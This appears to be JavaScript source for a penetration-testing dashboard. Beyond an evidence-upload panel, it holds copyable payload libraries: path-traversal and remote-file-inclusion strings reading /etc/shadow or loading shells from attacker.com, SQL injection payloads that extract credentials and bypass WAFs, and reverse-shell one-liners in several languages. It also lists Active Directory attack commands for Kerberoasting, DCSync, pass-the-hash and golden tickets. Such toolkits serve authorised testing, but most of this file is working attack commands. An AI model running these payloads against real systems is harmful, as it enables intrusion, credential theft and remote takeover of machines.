// ========== EVIDENCE ==========
let evidenceFiles = JSON.parse(localStorage.getItem('spectra_evidence') || '[]');

function loadEvidence() { renderEvidenceGrid(); }

function renderEvidenceGrid() {
    const findingFilter = document.getElementById('evidence-finding-filter')?.value || '';
    let filtered = evidenceFiles;
    if (findingFilter) filtered = filtered.filter(e => e.finding_id === findingFilter);

    const grid = document.getElementById('evidence-grid');
    if (!filtered.length) {
        grid.innerHTML = '<div class="text-slate-500 text-sm text-center py-8 col-span-full">No evidence files yet. Upload or paste screenshots.</div>';
        return;
    }
    grid.innerHTML = filtered.map((e, i) => {
        const isImage = /\.(png|jpg|jpeg|gif|webp|svg)$/i.test(e.name) || e.type?.startsWith('image/');
        const safeThumbUrl = e.dataUrl?.startsWith('data:image/') ? e.dataUrl : '';
        const thumb = isImage && safeThumbUrl
            ? `<img src="${safeThumbUrl}" class="w-full h-32 object-cover rounded-t-lg" alt="${escapeHtml(e.name)}">`
            : `<div class="w-full h-32 flex items-center justify-center bg-slate-800 rounded-t-lg"><i data-lucide="file" class="w-8 h-8 inline-block text-slate-500"></i></div>`;
        const size = e.size ? formatFileSize(e.size) : '-';
        const ago = e.uploaded ? timeAgo(new Date(e.uploaded)) : '';
        return `<div class="evidence-card rounded-lg bg-slate-800/50 cursor-pointer" data-action="previewEvidence" data-value="${i}">
            ${thumb}
            <div class="p-2">
                <div class="text-xs text-white truncate">${escapeHtml(e.name)}</div>
                <div class="text-xs text-slate-500">${size} - ${ago}</div>
            </div>
            <button data-action="removeEvidenceStop" data-value="${i}" class="absolute top-1 right-1 w-5 h-5 bg-black/50 hover:bg-rose-600 text-white rounded-full text-xs flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity"><i data-lucide="x" class="w-3.5 h-3.5 inline-block"></i></button>
        </div>`;
    }).join('');
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function uploadEvidence(input) {
    Array.from(input.files).forEach(file => {
        const reader = new FileReader();
        reader.onload = () => {
            evidenceFiles.push({ name: file.name, type: file.type, size: file.size, dataUrl: reader.result, uploaded: new Date().toISOString(), finding_id: '' });
            localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
            renderEvidenceGrid();
        };
        reader.readAsDataURL(file);
    });
    input.value = '';
}

async function pasteEvidence() {
    try {
        const items = await navigator.clipboard.read();
        for (const item of items) {
            for (const type of item.types) {
                if (type.startsWith('image/')) {
                    const blob = await item.getType(type);
                    const reader = new FileReader();
                    reader.onload = () => {
                        const name = 'clipboard-' + Date.now() + '.' + type.split('/')[1];
                        evidenceFiles.push({ name, type, size: blob.size, dataUrl: reader.result, uploaded: new Date().toISOString(), finding_id: '' });
                        localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
                        renderEvidenceGrid();
                    };
                    reader.readAsDataURL(blob);
                }
            }
        }
    } catch (e) { console.debug('Clipboard read failed:', e); }
}

function initEvidenceDragDrop() {
    const dropzone = document.getElementById('evidence-dropzone');
    const panel = document.getElementById('panel-evidence');
    if (!panel) return;
    panel.addEventListener('dragenter', (e) => { e.preventDefault(); dropzone.classList.remove('hidden'); dropzone.classList.add('dragover'); });
    dropzone.addEventListener('dragleave', () => { dropzone.classList.add('hidden'); dropzone.classList.remove('dragover'); });
    dropzone.addEventListener('dragover', (e) => e.preventDefault());
    dropzone.addEventListener('drop', (e) => {
        e.preventDefault();
        dropzone.classList.add('hidden');
        dropzone.classList.remove('dragover');
        Array.from(e.dataTransfer.files).forEach(file => {
            const reader = new FileReader();
            reader.onload = () => {
                evidenceFiles.push({ name: file.name, type: file.type, size: file.size, dataUrl: reader.result, uploaded: new Date().toISOString(), finding_id: '' });
                localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
                renderEvidenceGrid();
            };
            reader.readAsDataURL(file);
        });
    });
}

function initClipboardPaste() {
    document.addEventListener('paste', (e) => {
        const panel = document.getElementById('panel-evidence');
        if (panel && !panel.classList.contains('hidden') && e.clipboardData?.files?.length) {
            e.preventDefault();
            Array.from(e.clipboardData.files).forEach(file => {
                if (!file.type.startsWith('image/')) return;
                const reader = new FileReader();
                reader.onload = () => {
                    evidenceFiles.push({ name: 'paste-' + Date.now() + '.png', type: file.type, size: file.size, dataUrl: reader.result, uploaded: new Date().toISOString(), finding_id: '' });
                    localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
                    renderEvidenceGrid();
                };
                reader.readAsDataURL(file);
            });
        }
    });
}

function previewEvidence(idx) {
    const e = evidenceFiles[idx];
    if (!e) return;
    const isImage = /\.(png|jpg|jpeg|gif|webp|svg)$/i.test(e.name) || e.type?.startsWith('image/');
    const safeUrl = e.dataUrl?.startsWith('data:image/') ? e.dataUrl : '';
    const safeDownload = e.dataUrl?.startsWith('data:') ? e.dataUrl : '';
    const content = isImage
        ? `<img src="${safeUrl}" class="max-w-full max-h-[70vh] mx-auto block p-4">`
        : `<div class="p-8 text-center"><i data-lucide="file" class="w-10 h-10 inline-block text-slate-500 mb-3"></i><p class="text-slate-300">${escapeHtml(e.name)}</p><a href="${safeDownload}" download="${escapeHtml(e.name)}" class="mt-3 inline-block px-4 py-2 bg-violet-600 hover:bg-violet-500 text-white rounded-lg text-sm transition-colors">Download</a></div>`;
    showSpectraModal(e.name, content, 'max-w-4xl');
}

function removeEvidence(idx) {
    _spectraConfirm('Delete this evidence file?', () => {
        evidenceFiles.splice(idx, 1);
        localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
        renderEvidenceGrid();
    }, { title: 'Delete Evidence' });
}

function filterEvidence() { renderEvidenceGrid(); }

function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
}

function timeAgo(date) {
    const s = Math.floor((Date.now() - date.getTime()) / 1000);
    if (s < 60) return s + 's ago';
    if (s < 3600) return Math.floor(s / 60) + 'm ago';
    if (s < 86400) return Math.floor(s / 3600) + 'h ago';
    return Math.floor(s / 86400) + 'd ago';
}


// ========== LFI/RFI PAYLOADS ==========
const LFI_PAYLOADS = [
    {cat:'Basic LFI', os:'linux', payload:'../../../etc/passwd', desc:'Read passwd file'},
    {cat:'Basic LFI', os:'linux', payload:'../../../etc/shadow', desc:'Read shadow file (need root)'},
    {cat:'Basic LFI', os:'linux', payload:'../../../etc/hosts', desc:'Read hosts file'},
    {cat:'Basic LFI', os:'linux', payload:'../../../proc/self/environ', desc:'Process environment variables'},
    {cat:'Basic LFI', os:'linux', payload:'../../../proc/self/cmdline', desc:'Process command line'},
    {cat:'Basic LFI', os:'linux', payload:'../../../var/log/auth.log', desc:'Auth logs (log poisoning)'},
    {cat:'Basic LFI', os:'linux', payload:'../../../var/log/apache2/access.log', desc:'Apache access log'},
    {cat:'Basic LFI', os:'windows', payload:'..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', desc:'Windows hosts file'},
    {cat:'Basic LFI', os:'windows', payload:'..\\..\\..\\windows\\win.ini', desc:'Windows ini file'},
    {cat:'Basic LFI', os:'windows', payload:'..\\..\\..\\windows\\system.ini', desc:'System ini file'},
    {cat:'Null Byte', os:'linux', payload:'../../../etc/passwd%00', desc:'Null byte bypass (PHP < 5.3)'},
    {cat:'Null Byte', os:'linux', payload:'../../../etc/passwd%00.png', desc:'Null byte with extension'},
    {cat:'Double Encoding', os:'linux', payload:'..%252f..%252f..%252fetc/passwd', desc:'Double URL encode ../'},
    {cat:'Double Encoding', os:'linux', payload:'%252e%252e%252f%252e%252e%252fetc/passwd', desc:'Full double encode'},
    {cat:'Filter Bypass', os:'linux', payload:'....//....//....//etc/passwd', desc:'Double dot bypass'},
    {cat:'Filter Bypass', os:'linux', payload:'..;/..;/..;/etc/passwd', desc:'Semicolon bypass (Tomcat)'},
    {cat:'Filter Bypass', os:'linux', payload:'/..\\..\\..\\etc/passwd', desc:'Backslash bypass'},
    {cat:'PHP Wrappers', os:'linux', payload:'php://filter/convert.base64-encode/resource=index.php', desc:'Read PHP source (base64)'},
    {cat:'PHP Wrappers', os:'linux', payload:'php://input', desc:'PHP input stream (POST data exec)'},
    {cat:'PHP Wrappers', os:'linux', payload:'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+', desc:'Data wrapper RCE'},
    {cat:'PHP Wrappers', os:'linux', payload:'expect://id', desc:'Expect wrapper (if enabled)'},
    {cat:'RFI', os:'linux', payload:'http://attacker.com/shell.txt', desc:'Basic RFI'},
    {cat:'RFI', os:'linux', payload:'http://attacker.com/shell.txt%00', desc:'RFI with null byte'},
    {cat:'RFI', os:'linux', payload:'\\\\attacker.com\\share\\shell.php', desc:'UNC path RFI (Windows)'},
];
let lfiOSFilter = 'all';

function initLFI() { renderLFI(); }

function renderLFI() {
    const search = (document.getElementById('lfi-search')?.value || '').toLowerCase();
    let filtered = LFI_PAYLOADS;
    if (lfiOSFilter !== 'all') filtered = filtered.filter(p => p.os === lfiOSFilter);
    if (search) filtered = filtered.filter(p => p.payload.toLowerCase().includes(search) || p.desc.toLowerCase().includes(search) || p.cat.toLowerCase().includes(search));

    let currentCat = '';
    let html = '';
    filtered.forEach(p => {
        if (p.cat !== currentCat) {
            currentCat = p.cat;
            html += `<div class="text-xs font-bold uppercase text-slate-500 mt-3 mb-1">${escapeHtml(currentCat)}</div>`;
        }
        const osColor = p.os === 'linux' ? 'text-emerald-400' : 'text-blue-400';
        html += `<div class="payload-row flex items-center gap-2 px-2 py-1.5 rounded text-xs cursor-pointer" data-action="clipCopy" data-value="${escapeAttr(p.payload)}">
            <span class="${osColor} text-xs uppercase w-12 shrink-0">${p.os}</span>
            <code class="text-violet-300 font-mono flex-1 truncate">${escapeHtml(p.payload)}</code>
            <span class="text-slate-500 text-xs shrink-0 truncate max-w-[150px]">${escapeHtml(p.desc)}</span>
            <span class="copy-btn text-slate-400 text-xs"><i data-lucide="copy" class="w-3.5 h-3.5 inline-block"></i></span>
        </div>`;
    });
    document.getElementById('lfi-list').innerHTML = html || '<div class="text-slate-500 text-xs py-4 text-center">No payloads found</div>';
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function filterLFI() { renderLFI(); }
function filterLFIOS(os) {
    lfiOSFilter = os;
    document.querySelectorAll('.lfi-os-btn').forEach(b => {
        b.className = b.dataset.os === os ? 'lfi-os-btn px-2 py-1 rounded text-[11px] bg-violet-600 text-white' : 'lfi-os-btn px-2 py-1 rounded text-[11px] bg-slate-800 text-slate-300 border border-white/5';
    });
    renderLFI();
}

// ========== SQL INJECTION PAYLOADS ==========
const SQLI_PAYLOADS = [
    {cat:'Detection', payload:"' OR '1'='1", desc:'Basic OR true'},
    {cat:'Detection', payload:"' OR '1'='1'--", desc:'OR true with comment'},
    {cat:'Detection', payload:"' OR 1=1#", desc:'OR true MySQL comment'},
    {cat:'Detection', payload:"1' ORDER BY 1--+", desc:'Column count detection'},
    {cat:'Detection', payload:"' AND 1=1--", desc:'Boolean true test'},
    {cat:'Detection', payload:"' AND 1=2--", desc:'Boolean false test'},
    {cat:'Detection', payload:"' AND SLEEP(5)--", desc:'Time-based blind test'},
    {cat:'UNION', payload:"' UNION SELECT NULL--", desc:'UNION 1 column'},
    {cat:'UNION', payload:"' UNION SELECT NULL,NULL--", desc:'UNION 2 columns'},
    {cat:'UNION', payload:"' UNION SELECT NULL,NULL,NULL--", desc:'UNION 3 columns'},
    {cat:'UNION', payload:"' UNION SELECT username,password FROM users--", desc:'Extract credentials'},
    {cat:'UNION', payload:"' UNION SELECT table_name,NULL FROM information_schema.tables--", desc:'List tables'},
    {cat:'UNION', payload:"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", desc:'List columns'},
    {cat:'Blind', payload:"' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--", desc:'Char-by-char extraction'},
    {cat:'Blind', payload:"' AND IF(1=1,SLEEP(5),0)--", desc:'MySQL time-based'},
    {cat:'Blind', payload:"'; WAITFOR DELAY '0:0:5'--", desc:'MSSQL time-based'},
    {cat:'Error-based', payload:"' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT database())))--", desc:'MySQL error-based'},
    {cat:'Error-based', payload:"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", desc:'MSSQL error-based'},
    {cat:'Error-based', payload:"' AND 1=CAST((SELECT version()) AS int)--", desc:'PostgreSQL error-based'},
    {cat:'WAF Bypass', payload:"/*!50000UNION*//*!50000SELECT*/1,2,3", desc:'MySQL version comment'},
    {cat:'WAF Bypass', payload:"' UNI/**/ON SEL/**/ECT 1,2,3--", desc:'Inline comment bypass'},
    {cat:'WAF Bypass', payload:"' %55nion %53elect 1,2,3--", desc:'URL-encoded keywords'},
    {cat:'WAF Bypass', payload:"' uNiOn aLl sElEcT 1,2,3--", desc:'Case variation'},
    {cat:'WAF Bypass', payload:"' || '1'='1", desc:'OR alternative syntax'},
];
const SQLI_CATEGORIES = ['All','Detection','UNION','Blind','Error-based','WAF Bypass'];
let sqliCatFilter = 'All';

function initSQLi() {
    document.getElementById('sqli-cat-filters').innerHTML = SQLI_CATEGORIES.map(c =>
        `<button class="sqli-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${c === 'All' ? 'bg-violet-600 text-white' : 'bg-slate-800 text-slate-300 border border-white/5'}" data-cat="${c}"  data-action="filterSQLiCat" data-value="${c}">${c}</button>`
    ).join('');
    renderSQLi();
}

function renderSQLi() {
    const search = (document.getElementById('sqli-search')?.value || '').toLowerCase();
    let filtered = SQLI_PAYLOADS;
    if (sqliCatFilter !== 'All') filtered = filtered.filter(p => p.cat === sqliCatFilter);
    if (search) filtered = filtered.filter(p => p.payload.toLowerCase().includes(search) || p.desc.toLowerCase().includes(search));

    let currentCat = '';
    let html = '';
    filtered.forEach(p => {
        if (p.cat !== currentCat) { currentCat = p.cat; html += `<div class="text-xs font-bold uppercase text-slate-500 mt-3 mb-1">${escapeHtml(currentCat)}</div>`; }
        html += `<div class="payload-row flex items-center gap-2 px-2 py-1.5 rounded text-xs cursor-pointer"  data-action="clipCopyCode">
            <code class="text-rose-300 font-mono flex-1 truncate">${escapeHtml(p.payload)}</code>
            <span class="text-slate-500 text-xs shrink-0 truncate max-w-[200px]">${escapeHtml(p.desc)}</span>
            <span class="copy-btn text-slate-400 text-xs"><i data-lucide="copy" class="w-3.5 h-3.5 inline-block"></i></span>
        </div>`;
    });
    document.getElementById('sqli-list').innerHTML = html || '<div class="text-slate-500 text-xs py-4 text-center">No payloads found</div>';
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function filterSQLi() { renderSQLi(); }
function filterSQLiCat(cat) {
    sqliCatFilter = cat;
    document.querySelectorAll('.sqli-cat-btn').forEach(b => {
        b.className = b.dataset.cat === cat ? 'sqli-cat-btn px-2 py-1 rounded text-[11px] bg-violet-600 text-white' : 'sqli-cat-btn px-2 py-1 rounded text-[11px] bg-slate-800 text-slate-300 border border-white/5';
    });
    renderSQLi();
}

// ========== PRIVILEGE ESCALATION (GTFOBins) ==========
const GTFOBINS = [
    {bin:'python3', fns:['shell','suid','sudo','file-read','reverse-shell'], cmds:{shell:"python3 -c 'import os; os.system(\"/bin/sh\")'", suid:"python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'", sudo:"sudo python3 -c 'import os; os.system(\"/bin/sh\")'", 'file-read':"python3 -c 'print(open(\"FILE\").read())'", 'reverse-shell':"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"}},
    {bin:'perl', fns:['shell','sudo','reverse-shell'], cmds:{shell:"perl -e 'exec \"/bin/sh\";'", sudo:"sudo perl -e 'exec \"/bin/sh\";'", 'reverse-shell':"perl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"}},
    {bin:'find', fns:['shell','suid','sudo'], cmds:{shell:"find . -exec /bin/sh -p \\; -quit", suid:"find / -perm -4000 -exec /bin/sh -p \\; -quit", sudo:"sudo find . -exec /bin/sh \\; -quit"}},
    {bin:'vim', fns:['shell','suid','sudo','file-read','file-write'], cmds:{shell:"vim -c ':!/bin/sh'", suid:"vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"sh\")'", sudo:"sudo vim -c ':!/bin/sh'", 'file-read':"vim FILE", 'file-write':"vim FILE (then :w)"}},
    {bin:'nmap', fns:['shell','sudo'], cmds:{shell:"nmap --interactive\\nnmap> !sh", sudo:"sudo nmap --interactive\\nnmap> !sh"}},
    {bin:'awk', fns:['shell','suid','sudo','file-read'], cmds:{shell:"awk 'BEGIN {system(\"/bin/sh\")}'", suid:"awk 'BEGIN {system(\"/bin/sh -p\")}'", sudo:"sudo awk 'BEGIN {system(\"/bin/sh\")}'", 'file-read':"awk '{print}' FILE"}},
    {bin:'less', fns:['shell','sudo','file-read'], cmds:{shell:"less /etc/passwd\\n!/bin/sh", sudo:"sudo less /etc/passwd\\n!/bin/sh", 'file-read':"less FILE"}},
    {bin:'more', fns:['shell','sudo','file-read'], cmds:{shell:"more /etc/passwd\\n!/bin/sh", sudo:"sudo more /etc/passwd\\n!/bin/sh", 'file-read':"TERM= more FILE"}},
    {bin:'tar', fns:['shell','sudo'], cmds:{shell:"tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", sudo:"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}},
    {bin:'bash', fns:['shell','suid','sudo'], cmds:{shell:"/bin/bash", suid:"bash -p", sudo:"sudo bash"}},
    {bin:'cp', fns:['suid','sudo','file-write'], cmds:{suid:"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p", sudo:"sudo cp /etc/shadow /tmp/shadow", 'file-write':"cp PAYLOAD TARGET"}},
    {bin:'chmod', fns:['suid','sudo'], cmds:{suid:"chmod +s /bin/bash", sudo:"sudo chmod +s /bin/bash"}},
    {bin:'env', fns:['shell','sudo'], cmds:{shell:"env /bin/sh", sudo:"sudo env /bin/sh"}},
    {bin:'node', fns:['shell','sudo','reverse-shell'], cmds:{shell:"node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-i\"],{stdio:[0,1,2]})'", sudo:"sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'", 'reverse-shell':"node -e '(function(){var c=require(\"child_process\").spawn(\"/bin/sh\",[]);var s=require(\"net\").connect(PORT,\"IP\",function(){c.stdin.pipe(s);s.pipe(c.stdout);s.pipe(c.stderr)})})();'"}},
    {bin:'php', fns:['shell','sudo','file-read','reverse-shell'], cmds:{shell:"php -r 'system(\"/bin/sh\");'", sudo:"sudo php -r 'system(\"/bin/sh\");'", 'file-read':"php -r 'echo file_get_contents(\"FILE\");'", 'reverse-shell':"php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"}},
    {bin:'ruby', fns:['shell','sudo','reverse-shell'], cmds:{shell:"ruby -e 'exec \"/bin/sh\"'", sudo:"sudo ruby -e 'exec \"/bin/sh\"'", 'reverse-shell':"ruby -rsocket -e 'f=TCPSocket.open(\"IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"}},
    {bin:'wget', fns:['file-write'], cmds:{'file-write':"wget http://attacker.com/payload -O /target/path"}},
    {bin:'curl', fns:['file-read','file-write'], cmds:{'file-read':"curl file:///etc/passwd", 'file-write':"curl http://attacker.com/payload -o /target/path"}},
];
const PRIVESC_FUNCTIONS = ['All','shell','suid','sudo','file-read','file-write','reverse-shell'];
let privescFnFilter = 'All';

function initPrivEsc() {
    document.getElementById('privesc-fn-filters').innerHTML = PRIVESC_FUNCTIONS.map(f =>
        `<button class="privesc-fn-btn px-2 py-1 rounded text-[11px] transition-colors ${f === 'All' ? 'bg-violet-600 text-white' : 'bg-slate-800 text-slate-300 border border-white/5'}" data-fn="${f}"  data-action="filterPrivEscFn" data-value="${f}">${f === 'All' ? 'All' : f.charAt(0).toUpperCase() + f.slice(1).replace('-',' ')}</button>`
    ).join('');
    renderPrivEsc();
}

function renderPrivEsc() {
    const search = (document.getElementById('privesc-search')?.value || '').toLowerCase();
    let filtered = GTFOBINS;
    if (privescFnFilter !== 'All') filtered = filtered.filter(b => b.fns.includes(privescFnFilter));
    if (search) filtered = filtered.filter(b => b.bin.toLowerCase().includes(search));

    document.getElementById('privesc-list').innerHTML = filtered.map(b => {
        const fnBadges = b.fns.map(f => {
            const colors = {shell:'bg-emerald-500/20 text-emerald-400', suid:'bg-rose-500/20 text-rose-400', sudo:'bg-amber-500/20 text-amber-400', 'file-read':'bg-blue-500/20 text-blue-400', 'file-write':'bg-violet-500/20 text-violet-400', 'reverse-shell':'bg-pink-500/20 text-pink-400'};
            return `<span class="px-1.5 py-0.5 rounded text-xs ${colors[f] || 'bg-slate-500/20 text-slate-400'}">${f}</span>`;
        }).join('');
        const cmds = Object.entries(b.cmds).map(([fn, cmd]) =>
            `<div class="mt-1"><span class="text-xs text-slate-500 uppercase">${fn}:</span>
            <div class="flex items-center gap-1 mt-0.5"><code class="text-[11px] text-violet-300 font-mono bg-black/30 rounded px-1.5 py-0.5 flex-1 truncate">${escapeHtml(cmd)}</code>
            <button data-action="clipCopyStop" data-value="${escapeAttr(cmd)}" class="text-slate-400 hover:text-white text-xs shrink-0 px-1"><i data-lucide="copy" class="w-3.5 h-3.5 inline-block"></i></button></div></div>`
        ).join('');
        return `<div class="border border-white/5 rounded-lg p-3 bg-slate-800/30">
            <div class="flex items-center gap-2 mb-2">
                <span class="text-sm font-bold text-white font-mono">${escapeHtml(b.bin)}</span>
            </div>
            <div class="flex flex-wrap gap-1 mb-2">${fnBadges}</div>
            <div class="space-y-1">${cmds}</div>
        </div>`;
    }).join('') || '<div class="text-slate-500 text-xs py-4 text-center col-span-full">No binaries found</div>';
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function filterPrivEsc() { renderPrivEsc(); }
function filterPrivEscFn(fn) {
    privescFnFilter = fn;
    document.querySelectorAll('.privesc-fn-btn').forEach(b => {
        b.className = b.dataset.fn === fn ? 'privesc-fn-btn px-2 py-1 rounded text-[11px] bg-violet-600 text-white' : 'privesc-fn-btn px-2 py-1 rounded text-[11px] bg-slate-800 text-slate-300 border border-white/5';
    });
    renderPrivEsc();
}

// ========== AD ENUMERATION ==========
const AD_SECTIONS = [
    {name:'Initial Enumeration', cmds:[
        {cmd:'crackmapexec smb {dc} --shares', desc:'Enumerate SMB shares'},
        {cmd:'crackmapexec smb {dc} --users', desc:'Enumerate domain users'},
        {cmd:'crackmapexec smb {dc} --groups', desc:'Enumerate domain groups'},
        {cmd:'enum4linux -a {dc}', desc:'Full enum4linux scan'},
        {cmd:'ldapsearch -x -H ldap://{dc} -b "DC={domain_parts}" "(objectClass=user)"', desc:'LDAP user enumeration'},
        {cmd:'nmap -p 88,135,139,389,445,636,3268 {dc}', desc:'Scan AD-related ports'},
        {cmd:'rpcclient -U "" -N {dc}', desc:'Null session RPC'},
        {cmd:'smbclient -L //{dc} -N', desc:'List SMB shares (null session)'},
    ]},
    {name:'Kerberos Attacks', cmds:[
        {cmd:'impacket-GetNPUsers {domain}/ -usersfile users.txt -no-pass -dc-ip {dc}', desc:'AS-REP Roasting'},
        {cmd:'impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {dc} -request', desc:'Kerberoasting'},
        {cmd:'kerbrute userenum --dc {dc} -d {domain} users.txt', desc:'Username enumeration via Kerberos'},
        {cmd:'kerbrute passwordspray --dc {dc} -d {domain} users.txt {pass}', desc:'Password spraying'},
        {cmd:'impacket-ticketer -nthash HASH -domain-sid S-1-5-... -domain {domain} Administrator', desc:'Golden ticket'},
    ]},
    {name:'Credential Attacks', cmds:[
        {cmd:'impacket-secretsdump {domain}/{user}:{pass}@{dc}', desc:'DCSync / dump secrets'},
        {cmd:'crackmapexec smb {dc} -u {user} -p {pass} --sam', desc:'Dump SAM database'},
        {cmd:'crackmapexec smb {dc} -u {user} -p {pass} --lsa', desc:'Dump LSA secrets'},
        {cmd:'crackmapexec smb {dc} -u {user} -H NTHASH --pass-the-hash', desc:'Pass the hash'},
        {cmd:'impacket-ntlmrelayx -tf targets.txt -smb2support', desc:'NTLM relay attack'},
    ]},
    {name:'Lateral Movement', cmds:[
        {cmd:'impacket-psexec {domain}/{user}:{pass}@{dc}', desc:'PSExec remote shell'},
        {cmd:'impacket-wmiexec {domain}/{user}:{pass}@{dc}', desc:'WMI remote execution'},
        {cmd:'impacket-smbexec {domain}/{user}:{pass}@{dc}', desc:'SMB exec remote shell'},
        {cmd:'evil-winrm -i {dc} -u {user} -p {pass}', desc:'WinRM shell'},
        {cmd:'crackmapexec smb {dc} -u {user} -p {pass} -x "whoami"', desc:'Remote command execution'},
    ]},
    {name:'Privilege Escalation', cmds:[
        {cmd:'bloodhound-python -u {user} -p {pass} -d {domain} -dc {dc} -c All', desc:'BloodHound collection'},
        {cmd:'impacket-findDelegation {domain}/{user}:{pass} -dc-ip {dc}', desc:'Find delegation rights'},
        {cmd:'crackmapexec ldap {dc} -u {user} -p {pass} -M laps', desc:'LAPS password extraction'},
        {cmd:'impacket-rbcd -delegate-to TARGET$ -action write {domain}/{user}:{pass}', desc:'RBCD attack'},
    ]},
];

function renderADCommands() {
    const domain = document.getElementById('ad-domain')?.value || 'DOMAIN';
    const user = document.getElementById('ad-user')?.value || 'user';
    const pass = document.getElementById('ad-pass')?.value || 'password';
    const dc = document.getElementById('ad-dc')?.value || '10.10.10.10';
    const domainParts = domain.split('.').map(p => 'DC=' + p).join(',');

    document.getElementById('adenum-list').innerHTML = AD_SECTIONS.map(section => {
        const cmds = section.cmds.map(c => {
            const resolved = c.cmd.replace(/\{domain\}/g, domain).replace(/\{user\}/g, user).replace(/\{pass\}/g, pass).replace(/\{dc\}/g, dc).replace(/\{domain_parts\}/g, domainParts);
            return `<div class="payload-row flex items-center gap-2 px-2 py-1.5 rounded text-xs">
                <code class="text-violet-300 font-mono flex-1 truncate">${escapeHtml(resolved)}</code>
                <span class="text-slate-500 text-xs shrink-0 truncate max-w-[180px]">${escapeHtml(c.desc)}</span>
                <button  data-action="clipCopyPayloadCode" class="copy-btn text-slate-400 hover:text-white text-xs shrink-0"><i data-lucide="copy" class="w-3.5 h-3.5 inline-block"></i></button>
            </div>`;
        }).join('');
        return `<div class="border border-white/5 rounded-lg overflow-hidden">
            <button data-action="toggleAccordion" class="w-full flex items-center justify-between px-4 py-2.5 bg-slate-800/50 hover:bg-slate-800 text-left transition-colors">
                <span class="text-xs font-medium text-white">${escapeHtml(section.name)}</span>
                <i data-lucide="chevron-down" class="w-3.5 h-3.5 inline-block text-slate-500 transition-transform"></i>
            </button>
            <div class="accordion-content open"><div class="p-2 space-y-0.5">${cmds}</div></div>
        </div>`;
    }).join('');
    if (typeof lucide !== 'undefined') lucide.createIcons();
}
